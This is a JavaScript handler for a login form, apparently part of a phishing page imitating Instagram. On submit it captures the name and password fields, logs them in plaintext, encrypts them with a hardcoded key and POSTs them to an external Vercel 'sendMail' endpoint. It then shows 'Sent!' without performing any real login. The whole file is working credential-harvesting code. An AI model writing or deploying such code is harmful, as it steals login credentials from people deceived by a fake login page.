const btn = document.getElementById('submit');

document.getElementById('form').addEventListener('submit', function(event) {
  event.preventDefault();

  btn.value = 'Sending...';
  btn.disabled = true;

  const formData = new FormData(this);
  const data = {
    name: formData.get('name')?.trim() || '',
    password: formData.get('password')?.trim() || ''
  };
  console.log('Form data:', data);

  const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(data), 'my-secret-key-1234567890123456').toString();

  fetch('https://insta-backend-lime-six.vercel.app/api/sendMail', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ encrypted: encryptedData })
  })
    .then(async (response) => {
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(errorText || `HTTP ${response.status}`);
      }
      return response.json();
    })
    .then(result => {
      btn.value = 'Log In';
      btn.disabled = false;
      alert('✅ Sent!');
      console.log('Success:', result);
    })
    .catch(error => {
      btn.value = 'Log In';
      btn.disabled = false;
      alert('❌ Error: ' + error.message);
      console.error('Error:', error);
    });
});
